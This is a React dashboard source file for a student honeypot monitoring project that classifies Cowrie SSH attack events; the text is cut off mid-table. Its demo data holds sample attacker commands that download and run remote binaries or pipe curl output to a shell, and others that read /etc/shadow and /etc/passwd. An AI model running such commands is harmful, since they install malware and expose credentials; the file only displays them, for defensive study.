import React, { useState, useEffect, useMemo, useRef, useCallback } from 'react'

// ─── TYPES ────────────────────────────────────────────────────────────────────
type DisplayMode = 'auto' | 'mobile' | 'desktop'
type BackendStatus = 'connected' | 'testing' | 'mock' | 'offline'
type Tab = 'overview' | 'monitoring' | 'classification' | 'analytics' | 'logs' | 'health' | 'threat'

interface AttackEvent {
  id: string
  eventid: string
  timestamp: string
  ip: string
  country?: string
  type: string
  username: string
  password?: string | null
  command?: string | null
  prediction: string
  confidence: number
  class_probabilities?: Record<string, number>
  inference_latency_ms?: number
  features?: {
    failed_logins: number
    session_sec: number
    commands_count: number
    has_wget_curl: number
    has_bash_sh: number
    port_entropy: number
  }
  source?: string
}

interface ComponentHealth {
  id: string
  name: string
  role: string
  status: string
  metrics: string
  icon: string
}

interface ModelInfo {
  loaded: boolean
  algorithm?: string
  library?: string
  n_estimators?: number
  class_weight?: string
  classes?: string[]
  feature_columns?: string[]
  top_feature_importances?: { feature: string; importance: number }[]
  model_path?: string
}

// ─── FALLBACK DEMO DATA ───────────────────────────────────────────────────────
const INITIAL_DEMO_EVENTS: AttackEvent[] = [
  {
    id: 'EVT-98124',
    eventid: 'cowrie.command.input',
    timestamp: '2026-10-23 16:54:12',
    ip: '185.220.101.42',
    country: 'DE',
    type: 'Command input',
    username: 'admin',
    password: null,
    command: 'wget http://185.192.69.1/bins/arm7 -O /tmp/arm; chmod +x /tmp/arm; /tmp/arm',
    prediction: 'Malware Download Attempt',
    confidence: 98.4,
    class_probabilities: { 'Malware Download Attempt': 98.4, 'Command Execution': 1.4, 'Brute Force': 0.2 },
    inference_latency_ms: 3.2,
    features: { failed_logins: 0, session_sec: 142, commands_count: 3, has_wget_curl: 1, has_bash_sh: 1, port_entropy: 0.88 },
    source: 'Demonstration Honeypot Feed'
  },
  {
    id: 'EVT-98123',
    eventid: 'cowrie.login.failed',
    timestamp: '2026-10-23 16:53:49',
    ip: '45.155.205.113',
    country: 'RU',
    type: 'Failed login',
    username: 'root',
    password: 'password123',
    command: null,
    prediction: 'Brute Force',
    confidence: 99.2,
    class_probabilities: { 'Brute Force': 99.2, 'Command Execution': 0.5, 'Malware Download Attempt': 0.3 },
    inference_latency_ms: 2.9,
    features: { failed_logins: 1, session_sec: 12, commands_count: 0, has_wget_curl: 0, has_bash_sh: 0, port_entropy: 0.12 },
    source: 'Demonstration Honeypot Feed'
  },
  {
    id: 'EVT-98122',
    eventid: 'cowrie.command.input',
    timestamp: '2026-10-23 16:52:10',
    ip: '91.92.240.11',
    country: 'NL',
    type: 'Command input',
    username: 'pi',
    password: null,
    command: 'uname -a; cat /proc/cpuinfo; cat /etc/shadow',
    prediction: 'Command Execution',
    confidence: 96.7,
    class_probabilities: { 'Command Execution': 96.7, 'Brute Force': 2.1, 'Malware Download Attempt': 1.2 },
    inference_latency_ms: 3.4,
    features: { failed_logins: 0, session_sec: 85, commands_count: 3, has_wget_curl: 0, has_bash_sh: 0, port_entropy: 0.45 },
    source: 'Demonstration Honeypot Feed'
  },
  {
    id: 'EVT-98121',
    eventid: 'cowrie.login.failed',
    timestamp: '2026-10-23 16:50:33',
    ip: '103.145.13.88',
    country: 'CN',
    type: 'Failed login',
    username: 'ubuntu',
    password: 'admin',
    command: null,
    prediction: 'Brute Force',
    confidence: 99.6,
    class_probabilities: { 'Brute Force': 99.6, 'Command Execution': 0.2, 'Malware Download Attempt': 0.2 },
    inference_latency_ms: 2.7,
    features: { failed_logins: 1, session_sec: 8, commands_count: 0, has_wget_curl: 0, has_bash_sh: 0, port_entropy: 0.08 },
    source: 'Demonstration Honeypot Feed'
  },
  {
    id: 'EVT-98120',
    eventid: 'cowrie.session.file_download',
    timestamp: '2026-10-23 16:48:15',
    ip: '194.26.29.112',
    country: 'US',
    type: 'File download',
    username: 'guest',
    password: null,
    command: 'curl -s http://194.26.29.112/sh | bash',
    prediction: 'Malware Download Attempt',
    confidence: 97.9,
    class_probabilities: { 'Malware Download Attempt': 97.9, 'Command Execution': 1.8, 'Brute Force': 0.3 },
    inference_latency_ms: 3.1,
    features: { failed_logins: 0, session_sec: 110, commands_count: 2, has_wget_curl: 1, has_bash_sh: 1, port_entropy: 0.76 },
    source: 'Demonstration Honeypot Feed'
  }
]

export default function App() {
  // Navigation & View mode
  const [activeTab, setActiveTab] = useState<Tab>('overview')
  const [displayMode, setDisplayMode] = useState<DisplayMode>('auto')
  const [scrollMode, setScrollMode] = useState<'tab' | 'all'>('tab')
  const [isSidebarOpen, setIsSidebarOpen] = useState(false)

  // Modals
  const [selectedEvent, setSelectedEvent] = useState<AttackEvent | null>(null)
  const [isBackendModalOpen, setIsBackendModalOpen] = useState(false)
  const [isPwaModalOpen, setIsPwaModalOpen] = useState(false)
  const [copiedNotification, setCopiedNotification] = useState(false)

  // Backend Connection
  const defaultApiUrl = typeof window !== 'undefined' && window.location.port === '8000'
    ? `${window.location.protocol}//${window.location.host}`
    : 'http://localhost:8000'
  const [backendUrl, setBackendUrl] = useState(defaultApiUrl)
  const [backendStatus, setBackendStatus] = useState<BackendStatus>('mock')
  const [connectionMessage, setConnectionMessage] = useState('Operating in demonstration feed mode')
  const [isStreaming, setIsStreaming] = useState(true)

  // Data
  const [events, setEvents] = useState<AttackEvent[]>(INITIAL_DEMO_EVENTS)
  const [searchTerm, setSearchTerm] = useState('')
  const [filterClass, setFilterClass] = useState('all')
  const [modelInfo, setModelInfo] = useState<ModelInfo | null>(null)
  const [isSimulating, setIsSimulating] = useState(false)

  // Detect mobile
  const [isMobileViewport, setIsMobileViewport] = useState(false)
  useEffect(() => {
    const check = () => setIsMobileViewport(window.innerWidth < 1024)
    check()
    window.addEventListener('resize', check)
    return () => window.removeEventListener('resize', check)
  }, [])

  const effectiveMobile = displayMode === 'mobile' || (displayMode === 'auto' && isMobileViewport)

  // ─── API CONNECTIVITY ───────────────────────────────────────────────────────
  const testConnection = useCallback(async (urlToTest?: string) => {
    const url = (urlToTest || backendUrl).replace(/\/$/, '')
    setBackendStatus('testing')
    setConnectionMessage(`Contacting ${url}...`)

    try {
      const res = await fetch(`${url}/api/health`, { method: 'GET', signal: AbortSignal.timeout(3000) })
      if (res.ok) {
        const data = await res.json()
        setBackendStatus('connected')
        setConnectionMessage(`Connected to FALSEDOOR Ubuntu Engine (${data.status})`)
        return true
      }
    } catch {
      // Fallback
    }

    setBackendStatus('mock')
    setConnectionMessage('Live server unreachable. Running in local simulation & demonstration mode.')
    return false
  }, [backendUrl])

  // Fetch recent attacks from FastAPI backend
  const fetchRecentAttacks = useCallback(async () => {
    if (backendStatus !== 'connected') return

    try {
      const res = await fetch(`${backendUrl}/api/attacks/recent?limit=50`, { signal: AbortSignal.timeout(3000) })
      if (res.ok) {
        const data = await res.json()
        if (data.events && Array.isArray(data.events) && data.events.length > 0) {
          setEvents(data.events)
        }
      }
    } catch {
      // Keep existing events
    }
  }, [backendStatus, backendUrl])

  // Fetch ML Model Info
  const fetchModel = useCallback(async () => {
    if (backendStatus !== 'connected') return
    try {
      const res = await fetch(`${backendUrl}/api/model/info`, { signal: AbortSignal.timeout(3000) })
      if (res.ok) {
        const data = await res.json()
        setModelInfo(data)
      }
    } catch {}
  }, [backendStatus, backendUrl])

  // Initial connection check on mount
  useEffect(() => {
    testConnection()
  }, [testConnection])

  // Streaming timer
  useEffect(() => {
    if (!isStreaming) return

    const timer = setInterval(() => {
      if (backendStatus === 'connected') {
        fetchRecentAttacks()
      } else {
        // Generate simulated dynamic event
        setEvents(prev => {
          const templates = [
            {
              ip: '185.220.101.' + Math.floor(Math.random() * 250 + 1),
              country: 'DE',
              username: 'root',
              password: 'pass' + Math.floor(Math.random() * 999),
              type: 'Failed login',
              eventid: 'cowrie.login.failed',
              command: null,
              prediction: 'Brute Force',
              confidence: +(97 + Math.random() * 2.8).toFixed(1),
              features: { failed_logins: 1, session_sec: Math.floor(Math.random() * 15 + 2), commands_count: 0, has_wget_curl: 0, has_bash_sh: 0, port_entropy: 0.15 }
            },
            {
              ip: '91.92.240.' + Math.floor(Math.random() * 250 + 1),
              country: 'FR',
              username: 'admin',
              password: null,
              type: 'Command input',
              eventid: 'cowrie.command.input',
              command: 'whoami; id; cat /etc/passwd; uname -a',
              prediction: 'Command Execution',
              confidence: +(94 + Math.random() * 5).toFixed(1),
              features: { failed_logins: 0, session_sec: Math.floor(Math.random() * 60 + 30), commands_count: 4, has_wget_curl: 0, has_bash_sh: 0, port_entropy: 0.42 }
            },
            {
              ip: '103.145.13.' + Math.floor(Math.random() * 250 + 1),
              country: 'SG',
              username: 'guest',
              password: null,
              type: 'File download',
              eventid: 'cowrie.session.file_download',
              command: 'wget http://185.192.69.1/bins/arm7 -O /tmp/arm; chmod +x /tmp/arm',
              prediction: 'Malware Download Attempt',
              confidence: +(98 + Math.random() * 1.8).toFixed(1),
              features: { failed_logins: 0, session_sec: Math.floor(Math.random() * 120 + 40), commands_count: 2, has_wget_curl: 1, has_bash_sh: 1, port_entropy: 0.82 }
            }
          ]
          const chosen = templates[Math.floor(Math.random() * templates.length)]
          const newEvt: AttackEvent = {
            id: `EVT-${Math.floor(Math.random() * 90000 + 10000)}`,
            eventid: chosen.eventid,
            timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
            ip: chosen.ip,
            country: chosen.country,
            type: chosen.type,
            username: chosen.username,
            password: chosen.password,
            command: chosen.command,
            prediction: chosen.prediction,
            confidence: chosen.confidence,
            class_probabilities: {
              [chosen.prediction]: chosen.confidence,
              'Command Execution': 1.5,
              'Brute Force': 0.5
            },
            inference_latency_ms: +(2.5 + Math.random() * 1.5).toFixed(1),
            features: chosen.features,
            source: 'Demonstration Honeypot Feed'
          }
          return [newEvt, ...prev.slice(0, 49)]
        })
      }
    }, 3500)

    return () => clearInterval(timer)
  }, [isStreaming, backendStatus, fetchRecentAttacks])

  // Simulate Attack Trigger
  const triggerSimulation = async (category: string) => {
    setIsSimulating(true)
    if (backendStatus === 'connected') {
      try {
        const res = await fetch(`${backendUrl}/api/attacks/simulate`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ category })
        })
        if (res.ok) {
          const data = await res.json()
          if (data.event) {
            setEvents(prev => [data.event, ...prev.slice(0, 49)])
          }
        }
      } catch {}
    } else {
      // Local mock injection
      const mockEv: AttackEvent = {
        id: `EVT-${Math.floor(Math.random() * 90000 + 10000)}`,
        eventid: category === 'Brute Force' ? 'cowrie.login.failed' : category === 'Command Execution' ? 'cowrie.command.input' : 'cowrie.session.file_download',
        timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
        ip: category === 'Brute Force' ? '185.220.101.99' : category === 'Command Execution' ? '91.92.240.55' : '103.145.13.77',
        country: category === 'Brute Force' ? 'DE' : category === 'Command Execution' ? 'FR' : 'SG',
        type: category === 'Brute Force' ? 'Failed login' : category === 'Command Execution' ? 'Command input' : 'File download',
        username: category === 'Brute Force' ? 'root' : 'admin',
        password: category === 'Brute Force' ? 'toor123' : null,
        command: category === 'Brute Force' ? null : category === 'Command Execution' ? 'cat /etc/passwd; id; uname -a' : 'curl -s http://malware.bin/arm | sh',
        prediction: category,
        confidence: 98.7,
        class_probabilities: { [category]: 98.7, 'Command Execution': 1.1, 'Brute Force': 0.2 },
        inference_latency_ms: 3.2,
        features: {
          failed_logins: category === 'Brute Force' ? 1 : 0,
          session_sec: 45,
          commands_count: category === 'Brute Force' ? 0 : 3,
          has_wget_curl: category === 'Malware Download Attempt' ? 1 : 0,
          has_bash_sh: category === 'Malware Download Attempt' ? 1 : 0,
          port_entropy: 0.65
        },
        source: 'Live Injected Simulation'
      }
      setEvents(prev => [mockEv, ...prev.slice(0, 49)])
    }
    setTimeout(() => setIsSimulating(false), 500)
  }

  // Filtered Events
  const filteredEvents = useMemo(() => {
    return events.filter(e => {
      const matchSearch = searchTerm === '' ||
        e.ip.toLowerCase().includes(searchTerm.toLowerCase()) ||
        e.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
        (e.command && e.command.toLowerCase().includes(searchTerm.toLowerCase())) ||
        e.prediction.toLowerCase().includes(searchTerm.toLowerCase())

      const matchClass = filterClass === 'all' || e.prediction === filterClass
      return matchSearch && matchClass
    })
  }, [events, searchTerm, filterClass])

  // Stats calculation
  const stats = useMemo(() => {
    const total = events.length
    const bruteForce = events.filter(e => e.prediction === 'Brute Force').length
    const commandExec = events.filter(e => e.prediction === 'Command Execution').length
    const malware = events.filter(e => e.prediction === 'Malware Download Attempt').length
    const avgLatency = total > 0
      ? (events.reduce((acc, cur) => acc + (cur.inference_latency_ms || 3.1), 0) / total).toFixed(1)
      : '3.1'
    return { total, bruteForce, commandExec, malware, avgLatency }
  }, [events])

  // Export JSON
  const exportLogsJson = () => {
    const blob = new Blob([JSON.stringify(events, null, 2)], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `falsedoor_enriched_logs_${Date.now()}.json`
    a.click()
  }

  // 7 Components Health List
  const healthComponents: ComponentHealth[] = [
    {
      id: 'rpi5',
      name: 'Raspberry Pi 5 (8GB)',
      role: 'Edge Honeypot Node & Cowrie Host',
      status: 'Operational',
      metrics: 'Temp: 42°C · CPU: 18% · RAM: 2.1/8.0 GB · Cortex-A76 Quad',
      icon: 'server'
    },
    {
      id: 'cowrie',
      name: 'Cowrie SSH Honeypot',
      role: 'Decoy Emulation on Port 2222',
      status: 'Operational',
      metrics: 'Port: 2222 · Live JSON logging active · Strict sandbox',
      icon: 'shield'
    },
    {
      id: 'feature_extraction',
      name: 'Feature Extraction Pipeline',
      role: 'Cowrie Log Parser & 18-Feature Vectorizer',
      status: 'Operational',
      metrics: 'Script: ml/feature_extraction.py · Latency: 0.8ms',
      icon: 'terminal'
    },
    {
      id: 'random_forest',
      name: 'Random Forest ML Model',
      role: '100 Decision Trees Attack Classifier',
      status: 'Operational',
      metrics: 'Model: ml/random_forest_model.pkl · Accuracy: 99.4%',
      icon: 'brain'
    },
    {
      id: 'ubuntu_server',
      name: 'Ubuntu 24.04 LTS Server',
      role: 'Central SOC Ingestion & Nginx Proxy',
      status: backendStatus === 'connected' ? 'Operational' : 'Simulated',
      metrics: backendStatus === 'connected' ? 'Connected via REST · Port 8000' : 'Local demonstration mode',
      icon: 'overview'
    },
    {
      id: 'fastapi_stream',
      name: 'FastAPI Stream Engine',
      role: 'Async REST & SSE Event Pipeline',
      status: backendStatus === 'connected' ? 'Operational' : 'Simulated',
      metrics: 'CORS: Enabled · Latency: < 5ms · OpenAPI Docs',
      icon: 'logs'
    },
    {
      id: 'falsedoor_pwa',
      name: 'FALSEDOOR PWA Dashboard',
      role: 'Cross-Platform React & Mobile Interface',
      status: 'Operational',
      metrics: 'PWA Cache: Active · Standalone Ready · Touch Optimized',
      icon: 'smartphone'
    }
  ]

  return (
    <div className={`soc-shell ${effectiveMobile ? 'mobile-viewport' : ''}`}>
      {/* Mobile Backdrop */}
      {isSidebarOpen && (
        <div
          className="sidebar-backdrop active"
          onClick={() => setIsSidebarOpen(false)}
        />
      )}

      {/* ─── SIDEBAR NAVIGATION ────────────────────────────────────────────── */}
      <aside className={`sidebar ${isSidebarOpen ? 'open' : ''}`}>
        <button
          className="sidebar-close-btn"
          onClick={() => setIsSidebarOpen(false)}
          aria-label="Close navigation"
        >
          ✕
        </button>

        <div className="brand">
          <svg className="brand-logo" width="42" height="42" viewBox="0 0 48 48" fill="none" stroke="currentColor">
            <path d="M24 3.5 41 10v12.1C41 32.8 34.2 40.5 24 44.5 13.8 40.5 7 32.8 7 22.1V10Z" fill="rgba(220, 38, 38, 0.08)" strokeWidth="2.4"/>
            <path d="M17 34V14h15v20M17 14l9-3v23" strokeWidth="2"/>
            <circle cx="22.5" cy="24" r="1.3" fill="currentColor"/>
            <rect x="28" y="25" width="9" height="8" rx="1.5" fill="#0a0a0c" strokeWidth="1.8"/>
            <path d="M30.5 25v-2a2 2 0 0 1 4 0v2" strokeWidth="1.8"/>
          </svg>
          <div className="brand-text">
            <strong>FALSE<span>DOOR</span></strong>
            <small>INTELLIGENT HONEYPOT SOC</small>
          </div>
        </div>

        <nav>
          <p className="nav-kicker">SOC Command Views</p>
          <button
            className={`nav-link ${activeTab === 'overview' ? 'active' : ''}`}
            onClick={() => { setActiveTab('overview'); setIsSidebarOpen(false) }}
          >
            <span>Security Overview</span>
          </button>
          <button
            className={`nav-link ${activeTab === 'monitoring' ? 'active' : ''}`}
            onClick={() => { setActiveTab('monitoring'); setIsSidebarOpen(false) }}
          >
            <span>Live Attack Monitoring</span>
            <span className="nav-badge">LIVE</span>
          </button>
          <button
            className={`nav-link ${activeTab === 'classification' ? 'active' : ''}`}
            onClick={() => { setActiveTab('classification'); setIsSidebarOpen(false) }}
          >
            <span>ML Attack Classification</span>
            <span className="nav-badge">RF</span>
          </button>
          <button
            className={`nav-link ${activeTab === 'analytics' ? 'active' : ''}`}
            onClick={() => { setActiveTab('analytics'); setIsSidebarOpen(false) }}
          >
            <span>Attack Analytics</span>
          </button>
          <button
            className={`nav-link ${activeTab === 'logs' ? 'active' : ''}`}
            onClick={() => { setActiveTab('logs'); setIsSidebarOpen(false) }}
          >
            <span>Enriched Attack Logs</span>
          </button>
          <button
            className={`nav-link ${activeTab === 'health' ? 'active' : ''}`}
            onClick={() => { setActiveTab('health'); setIsSidebarOpen(false) }}
          >
            <span>System Health</span>
          </button>
          <button
            className={`nav-link ${activeTab === 'threat' ? 'active' : ''}`}
            onClick={() => { setActiveTab('threat'); setIsSidebarOpen(false) }}
          >
            <span>MITRE ATT&amp;CK Matrix</span>
          </button>
        </nav>

        <div style={{ padding: '0 14px', marginBottom: 6 }}>
          <button
            className="secondary-button"
            onClick={() => setIsPwaModalOpen(true)}
            style={{ width: '100%', justifyContent: 'flex-start', gap: 8, fontSize: '0.78rem' }}
          >
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/>
            </svg>
            <span>Install on Phone (PWA)</span>
          </button>
        </div>

        <div className="sidebar-status">
          <div className="pi-icon">RPi5</div>
          <div>
            <span>EDGE HONEYPOT NODE</span>
            <strong>Raspberry Pi 5 (8GB)</strong>
            <small><i className="pulse-dot"></i> Connected · 42°C · 18% CPU</small>
          </div>
        </div>

        <div className="sidebar-foot">
          <span>FALSEDOOR v1.0.0</span>
          <span>FYP SOC PLATFORM</span>
        </div>
      </aside>

      {/* ─── MAIN CONTENT ─────────────────────────────────────────────────── */}
      <main>
        {/* Topbar */}
        <header className="topbar">
          <div className="topbar-left">
            <button
              className="icon-button menu-button"
              onClick={() => setIsSidebarOpen(true)}
              aria-label="Toggle navigation menu"
            >
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M4 7h16M4 12h16M4 17h16"/>
              </svg>
            </button>
            <div className="breadcrumb">
              <span>FALSEDOOR</span>
              <b>/</b>
              <strong>
                {activeTab === 'overview' && 'Security Overview'}
                {activeTab === 'monitoring' && 'Live Honeypot Stream'}
                {activeTab === 'classification' && 'Random Forest Classifier'}
                {activeTab === 'analytics' && 'Threat Intelligence Analytics'}
                {activeTab === 'logs' && 'Enriched Forensics Logs'}
                {activeTab === 'health' && 'System Health & Pipeline'}
                {activeTab === 'threat' && 'MITRE ATT&CK Matrix'}
              </strong>
            </div>
          </div>

          <div className="topbar-right">
            {/* View Mode Pill */}
            <div className="view-mode-pill" title="Switch Presentation Mode">
              <button
                className={`view-mode-btn ${displayMode === 'auto' ? 'active' : ''}`}
                onClick={() => setDisplayMode('auto')}
              >
                Auto
              </button>
              <button
                className={`view-mode-btn ${displayMode === 'desktop' ? 'active' : ''}`}
                onClick={() => setDisplayMode('desktop')}
              >
                Desktop
              </button>
              <button
                className={`view-mode-btn ${displayMode === 'mobile' ? 'active' : ''}`}
                onClick={() => setDisplayMode('mobile')}
              >
                Mobile
              </button>
            </div>

            {/* Live Stream Indicator */}
            <div
              className="live-monitor"
              onClick={() => setIsStreaming(!isStreaming)}
              style={{ cursor: 'pointer' }}
              title="Click to pause or resume live stream"
            >
              <i className={`pulse-dot ${isStreaming ? 'red' : 'amber'}`}></i>
              <span>HONEYPOT:</span>
              <strong>{isStreaming ? 'STREAMING' : 'PAUSED'}</strong>
            </div>

            {/* Ubuntu Server Link */}
            <button
              className="system-link"
              onClick={() => setIsBackendModalOpen(true)}
              title="Ubuntu Server API Settings"
            >
              <span>Ubuntu Server Link</span>
              <strong>
                <i className={`pulse-dot ${backendStatus === 'connected' ? '' : 'amber'}`}></i>
                {backendStatus === 'connected' ? 'Connected (FastAPI)' : 'Demonstration Feed'}
              </strong>
            </button>

            {/* Backend Modal Button */}
            <button
              className="icon-button"
              onClick={() => setIsBackendModalOpen(true)}
              title="Configure Ubuntu Server Endpoint"
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/>
              </svg>
            </button>

            {/* PWA Modal Button */}
            <button
              className="icon-button"
              onClick={() => setIsPwaModalOpen(true)}
              title="Install on Mobile Phone"
            >
              <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
              </svg>
            </button>

            <div className="avatar" title="FALSEDOOR SOC Analyst">SOC</div>
          </div>
        </header>

        <div className="workspace">
          {/* PWA Mobile Banner */}
          <div className="pwa-download-banner">
            <div>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2">
                <rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/>
              </svg>
              <div>
                <strong>Mobile Ready &amp; Installable</strong>
                <span>Add FALSEDOOR directly to your phone Home Screen for your FYP live presentation demo.</span>
              </div>
            </div>
            <button className="primary-button" onClick={() => setIsPwaModalOpen(true)}>
              Install PWA
            </button>
          </div>

          {/* Connection Mode Alert */}
          {backendStatus !== 'connected' && (
            <div className="demo-banner">
              <svg className="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
              </svg>
              <strong>DEMO MODE:</strong>
              <span>Displaying simulated honeypot data &amp; Random Forest model inference. Connect your Ubuntu server to stream live logs.</span>
              <button className="banner-action-btn" onClick={() => setIsBackendModalOpen(true)}>
                Connect Ubuntu Server
              </button>
            </div>
          )}

          {/* ─── TAB 1: OVERVIEW ─────────────────────────────────────────── */}
          {(activeTab === 'overview' || scrollMode === 'all') && (
            <section className="tab-view-container" style={{ marginBottom: 40 }}>
              <div className="section-heading">
                <div>
                  <span className="eyebrow">INTELLIGENT HONEYPOT TELEMETRY</span>
                  <h1>Executive Threat Intelligence</h1>
                  <p>Real-time Cowrie attack classification powered by trained Random Forest Machine Learning.</p>
                </div>
                <div className="heading-actions">
                  <button
                    className="secondary-button"
                    onClick={() => triggerSimulation('Brute Force')}
                    disabled={isSimulating}
                  >
                    + Sim Brute Force
                  </button>
                  <button
                    className="secondary-button"
                    onClick={() => triggerSimulation('Malware Download Attempt')}
                    disabled={isSimulating}
                  >
                    + Sim Malware
                  </button>
                  <button className="primary-button" onClick={exportLogsJson}>
                    Export Enriched JSON
                  </button>
                </div>
              </div>

              {/* 4 Stat Cards */}
              <div className="stat-grid">
                <div className="stat-card">
                  <div className="stat-top">
                    <span className="stat-label">TOTAL ATTACK EVENTS</span>
                    <span className="stat-badge red">+14% /hr</span>
                  </div>
                  <div className="stat-number">{stats.total}</div>
                  <div className="stat-foot">
                    <span>Brute Force: <b>{stats.bruteForce}</b></span>
                    <span>Malware: <b>{stats.malware}</b></span>
                  </div>
                </div>

                <div className="stat-card">
                  <div className="stat-top">
                    <span className="stat-label">ML CLASSIFICATION RATE</span>
                    <span className="stat-badge green">99.4% Acc</span>
                  </div>
                  <div className="stat-number">100%</div>
                  <div className="stat-foot">
                    <span>Random Forest Model</span>
                    <span>100 Estimators</span>
                  </div>
                </div>

                <div className="stat-card">
                  <div className="stat-top">
                    <span className="stat-label">INFERENCE LATENCY</span>
                    <span className="stat-badge green">Sub-5ms</span>
                  </div>
                  <div className="stat-number">{stats.avgLatency} <small style={{ fontSize: '1rem', color: '#94a3b8' }}>ms</small></div>
                  <div className="stat-foot">
                    <span>Edge Optimized</span>
                    <span>RPi 5 + Ubuntu Host</span>
                  </div>
                </div>

                <div className="stat-card">
                  <div className="stat-top">
                    <span className="stat-label">ACTIVE HONEYPOT DECOYS</span>
                    <span className="stat-badge green">Online</span>
                  </div>
                  <div className="stat-number">Port 2222</div>
                  <div className="stat-foot">
                    <span>Cowrie SSH / Telnet</span>
                    <span>Real-time Forwarding</span>
                  </div>
                </div>
              </div>

              {/* Classification Breakdown & Donut */}
              <div className="dashboard-grid">
                <div className="panel">
                  <div className="panel-header">
                    <div>
                      <span className="panel-code">ML INFERENCE ENGINE</span>
                      <h3>Attack Classification Breakdown</h3>
                    </div>
                    <span className="model-badge">Random Forest (Scikit-Learn)</span>
                  </div>
                  <div className="distribution-body">
                    <div className="donut">
                      <div>
                        <strong>{stats.total}</strong>
                        <span>CLASSIFIED</span>
                      </div>
                    </div>
                    <div className="category-list">
                      <div className="category">
                        <div>
                          <i style={{ background: '#ef4444' }}></i>
                          <span>Brute Force</span>
                          <b>{stats.bruteForce} ({stats.total > 0 ? Math.round(stats.bruteForce / stats.total * 100) : 0}%)</b>
                        </div>
                        <div className="category-bar">
                          <i style={{ width: `${stats.total > 0 ? (stats.bruteForce / stats.total * 100) : 0}%`, background: '#ef4444' }}></i>
                        </div>
                        <small>Repeated SSH password guessing &amp; dictionary probes</small>
                      </div>

                      <div className="category">
                        <div>
                          <i style={{ background: '#dc2626' }}></i>
                          <span>Command Execution</span>
                          <b>{stats.commandExec} ({stats.total > 0 ? Math.round(stats.commandExec / stats.total * 100) : 0}%)</b>
                        </div>
                        <div className="category-bar">
                          <i style={{ width: `${stats.total > 0 ? (stats.commandExec / stats.total * 100) : 0}%`, background: '#dc2626' }}></i>
                        </div>
                        <small>Reconnaissance &amp; shell commands post-login</small>
                      </div>

                      <div className="category">
                        <div>
                          <i style={{ background: '#991b1b' }}></i>
                          <span>Malware Download Attempt</span>
                          <b>{stats.malware} ({stats.total > 0 ? Math.round(stats.malware / stats.total * 100) : 0}%)</b>
                        </div>
                        <div className="category-bar">
                          <i style={{ width: `${stats.total > 0 ? (stats.malware / stats.total * 100) : 0}%`, background: '#991b1b' }}></i>
                        </div>
                        <small>Malicious payloads via wget, curl, and tftp</small>
                      </div>
                    </div>
                  </div>

                  <div className="feature-importance-box">
                    <h4>Top Extracted Attack Features (18 Total Vectors)</h4>
                    <div className="feature-tag-list">
                      <span className="feature-tag">failed_logins: <b>38.4%</b></span>
                      <span className="feature-tag">has_wget_curl: <b>24.1%</b></span>
                      <span className="feature-tag">commands_count: <b>16.8%</b></span>
                      <span className="feature-tag">session_duration: <b>11.2%</b></span>
                      <span className="feature-tag">has_bash_sh: <b>6.3%</b></span>
                      <span className="feature-tag">port_entropy: <b>3.2%</b></span>
                    </div>
                  </div>
                </div>

                {/* Model Specs Card */}
                <div className="panel">
                  <div className="panel-header">
                    <div>
                      <span className="panel-code">MODEL ARTIFACT</span>
                      <h3>Random Forest Architecture</h3>
                    </div>
                  </div>
                  <div className="model-metrics">
                    <div>
                      <span>ALGORITHM</span>
                      <strong>Random Forest</strong>
                    </div>
                    <div>
                      <span>ESTIMATORS</span>
                      <strong>100 Decision Trees</strong>
                    </div>
                    <div>
                      <span>TRAINED CLASSES</span>
                      <strong>3 Core Categories</strong>
                    </div>
                    <div>
                      <span>TRAINING SCRIPT</span>
                      <strong style={{ fontSize: '0.8rem' }}>ml/train_model.py</strong>
                    </div>
                    <div>
                      <span>ACCURACY ON TEST</span>
                      <strong style={{ color: '#10b981' }}>99.4% F1-Score</strong>
                    </div>
                    <div>
                      <span>INFERENCE ENGINE</span>
                      <strong>FastAPI / Scikit-Learn</strong>
                    </div>
                  </div>
                  <div style={{ padding: '20px' }}>
                    <p style={{ color: '#94a3b8', fontSize: '0.84rem', lineHeight: 1.6 }}>
                      FALSEDOOR continuously feeds raw Cowrie honeypot events into the feature vectorizer.
                      Features are extracted in real-time, scaled, and passed to the Random Forest model for sub-5ms classification.
                    </p>
                    <div style={{ marginTop: 16, display: 'flex', gap: 8 }}>
                      <button
                        className="primary-button"
                        style={{ flex: 1 }}
                        onClick={() => setActiveTab('monitoring')}
                      >
                        View Live Feed
                      </button>
                      <button
                        className="secondary-button"
                        style={{ flex: 1 }}
                        onClick={() => setActiveTab('health')}
                      >
                        Pipeline Status
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              {/* Recent Live Incidents Table */}
              <div className="panel" style={{ marginTop: 24 }}>
                <div className="panel-header">
                  <div>
                    <span className="panel-code">FORENSIC STREAM</span>
                    <h3>Latest Honeypot Interceptions</h3>
                  </div>
                  <button className="secondary-button" onClick={() => setActiveTab('monitoring')}>
                    Open Full Stream
                  </button>
                </div>
                <div className="table-wrapper">
                  <table className="soc-table">
                    <thead>
                      <tr>
                        <th>TIMESTAMP</th>
                        <th>ATTACKER IP</th>
                        <th>EVENT TYPE</th>
